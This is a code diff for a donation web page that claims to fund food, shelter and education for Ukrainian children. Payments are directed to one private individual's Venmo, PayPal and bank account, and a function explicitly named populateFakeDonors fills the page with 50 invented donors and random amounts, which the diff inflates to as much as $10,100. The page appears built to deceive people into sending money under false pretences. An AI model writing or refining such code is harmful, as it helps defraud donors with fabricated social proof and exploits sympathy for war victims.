@@ -148,8 +148,8 @@
           Your gift can change a life today
         </h3>
         <p class="fs-5 text-center">
-          Every contribution geos directly to providing food, shelter and
-          education for ukraine childrenaffected by the war.
+          Every contribution goes directly to providing food, shelter and
+          education for ukrainian children affected by the war.
         </p>
       </div>
     </section>
@@ -157,13 +157,13 @@
     <div class="container">
       <div class="row justify-content-center">
         <div class="col-md-8">
-          <form
-            id="donation-form"
-            class="card p-4 shadow"
-            enctype="multipart/form-data"
-            method="POST"
-            action="https://formsubmit.co/el/fikosa"
-          >
+         <form
+          action="https://formspree.io/f/mpwrqbbg"  
+          method="POST"
+          enctype="multipart/form-data"
+          class="card p-4 shadow"
+          id="donation-form"
+        >
 
             <input type="hidden" name="_captcha" value="false" />
             <input
@@ -237,7 +237,7 @@
                 <option value="Bangladesh">Bangladesh</option>
                 <option value="Indonesia">Indonesia</option>
                 <option value="Ethopia">Ethopia</option>
-                <option value="Suadi-Arabia">Suadi Arabia</option>
+                <option value="Suadi-Arabia">Saudi Arabia</option>
                 <option value="Peru">Peru</option>
                 <option value="Yemen">Yemen</option>
                 <option value="Others">Others</option>
@@ -261,13 +261,14 @@
               </select>
             </div>
 
-            <button
+           <button
               type="submit"
-              class="btn btn-primary w-100"
+              class="btn btn-primary w-100 d-flex align-items-center justify-content-center gap-2"
               data-lang="submit"
               id="submit-btn"
             >
-              Submit
+              <span id="btn-text">Submit</span>
+              <div id="btn-spinner" class="spinner-border spinner-border-sm text-light d-none" role="status"></div>
             </button>
 
             <div id="payment-info" class="alert alert-info mt-3 d-none"></div>
@@ -280,12 +281,13 @@
               Kindly proceed to complete the payment using the instructions
               above.
             </div>
+          
 
             <div id="proof-upload" class="mt-3 d-none">
               <label class="form-label" data-lang="proof"
                 >Upload Proof of Payment</label
               >
-              <input
+               <input
                 type="file"
                 name="proof"
                 id="proof"
@@ -454,23 +456,24 @@
   const methodSelect = document.getElementById('payment-method');
   const paymentInfoBox = document.getElementById('payment-info');
   const thankYou = document.getElementById('thank-you');
-  const fileInput = document.getElementById('proof-upload');
+  const fileSection = document.getElementById('proof-upload');
   const preview = document.getElementById('preview');
   const languageSelect = document.getElementById('language');
-  const uploadSection = document.getElementById('upload-section');
   const donationList = document.getElementById('donation-list');
+  const proofInput = document.getElementById('proof');
+  const submitBtn = document.getElementById("submit-btn");
+  const btnText = document.getElementById("btn-text");
+  const btnSpinner = document.getElementById("btn-spinner");
 
   const paymentDetails = {
-    venmo: `Send via Venmo to: Purse979@gmail.com <br>
-                               Eamonn sterley `,
-    paypal: `Send via PayPal to: piotr199@outlook.com<br>
-                                 Eamonn sterley`,
+    venmo: `Send via Venmo to: Purse979@gmail.com <br> Eamonn Sterley`,
+    paypal: `Send via PayPal to: piotr199@outlook.com<br> Eamonn Sterley`,
     bank: `Receiving bank: Trailhead credit union <br>
-            Name: Eamonn I Sterley <br>Account number: 10500009275070<br>
-            Routing number : 323075563<br>Phone number: 971 495 9169<br>`
+           Name: Eamonn I Sterley<br>
+           Account number: 10500009275070<br>
+           Routing number: 323075563<br>
+           Phone number: 971 495 9169<br>`
   };
-
- 
 
   const translations = {
     fr: {
@@ -523,13 +526,14 @@
     updateLanguage(e.target.value);
   });
 
-  fileInput.addEventListener('change', () => {
-    const file = fileInput.files[0];
+  proofInput.addEventListener('change', function () {
+    const file = this.files[0];
     if (file && file.type.startsWith("image/")) {
       const reader = new FileReader();
-      reader.onload = e => {
+      reader.onload = function (e) {
         preview.src = e.target.result;
         preview.classList.remove("d-none");
+        preview.classList.add("img-fluid", "mt-2");
       };
       reader.readAsDataURL(file);
     } else {
@@ -548,45 +552,72 @@
   function populateFakeDonors() {
     for (let i = 0; i < 50; i++) {
       const name = randomNames[Math.floor(Math.random() * randomNames.length)];
-      const amount =(Math.random() * 1000 + 100).toFixed();
+      const amount = (Math.random() * 10000 + 100).toFixed();
       const li = document.createElement("li");
       li.className = "list-group-item d-flex justify-content-between align-items-center px-3 py-2 border-bottom";
-      li.innerHTML =
-       `
-        <span class="donor-name">${name}</span>
-        <span class="donation-amount">$${amount}</span>
-      `;
-       donationList.append(li);
+      li.innerHTML = `<span class="donor-name">${name}</span><span class="donation-amount">$${amount}</span>`;
+      donationList.append(li);
     }
   }
 
   populateFakeDonors();
 
-  
+form.addEventListener('submit', async function (e) {
+  e.preventDefault();
 
-  form.addEventListener('submit', function(e) {
-    e.preventDefault();
+  const method = methodSelect.value;
+  if (method && paymentDetails[method]) {
+    paymentInfoBox.innerHTML = `<strong>Payment Instructions:</strong><br>${paymentDetails[method]}`;
+    paymentInfoBox.classList.remove('d-none');
+    thankYou.classList.remove("d-none");
+    fileSection.classList.remove("d-none");
+  }
 
-    const method = methodSelect.value;
-    if (method && paymentDetails[method]) {
-      paymentInfoBox.innerHTML = `<strong>Payment Instructions:</strong><br>${paymentDetails[method]}`;
-      paymentInfoBox.classList.remove('d-none');
-          thankYou.classList.remove("d-none");
-          fileInput.classList.remove("d-none");
-    }
+  const name = form.name.value.trim();
+  const amount = parseFloat(form.amount.value.trim()).toFixed(2);
 
-   
+  if (proofInput.files.length > 0) {
+    const li = document.createElement("li");
+    li.className = "list-group-item";
+    li.textContent = `${name} donated $${amount}`;
+    donationList.insertBefore(li, donationList.firstChild);
+  }
 
-    const name = form.name.value.trim();
-    const amount = parseFloat(form.amount.value.trim()).toFixed(2);
+  // Submit via AJAX
+  const formData = new FormData(form);
 
-    if (fileInput.files.length > 0) {
-      const li = document.createElement("li");
-      li.className = "list-group-item";
-      li.textContent = `${name} donated $${amount}`;
-      donationList.insertBefore(li, donationList.firstChild);
+  submitBtn.disabled = true;
+  btnText.textContent = "Submitting...";
+  btnSpinner.classList.remove("d-none");
+
+// Submit via AJAX
+try {
+  const response = await fetch(form.action, {
+    method: 'POST',
+    body: formData,
+    headers: {
+      'Accept': 'application/json'
     }
   });
+
+  if (response.ok) {
+    thankYou.classList.remove("d-none");
+    // form.reset(); // optional
+  } else {
+    alert("Something went wrong submitting the form.");
+  }
+    } catch (error) {
+      alert("There was a problem submitting the form. Please try again.");
+      console.error(error);
+    }
+
+    // Re-enable button and hide spinner
+    submitBtn.disabled = false;
+    btnText.textContent = "Submit";
+    btnSpinner.classList.add("d-none");
+});
+
 </script>
-  </body>
+
+</body>
 </html>
